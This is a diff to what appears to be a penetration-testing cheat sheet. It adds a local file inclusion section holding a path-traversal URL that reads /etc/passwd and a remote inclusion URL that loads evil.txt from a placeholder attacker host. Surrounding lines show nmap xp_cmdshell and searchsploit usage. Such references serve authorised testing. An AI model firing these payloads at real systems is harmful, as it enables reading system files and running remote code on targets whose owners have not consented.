@@ -369,12 +369,6 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.p
 telnet $targetip 25
 ```
 
-## Finding files&#x20;
-
-```
-dir *.exe /b/s | findstr backdoor
-```
-
 ## Finding known exploits from Exploit-DB
 
 To update to latest Exploit-DB
@@ -399,4 +393,18 @@ To find item wihtout DOS attack
 
 ```
 searchsploit apache 2.x | grep -v '/dos/'
+```
+
+## <mark style="color:blue;">**Local File inclusions**</mark>
+
+Simple test if the target is vulnerable to LFI
+
+```
+http://target.com/?page=./../../../../../../../../../etc/passwd%00
+```
+
+Simple test if you can run a local script against the target
+
+```
+http://target.com/?page=http://hackerip/evil.txt%00
 ```
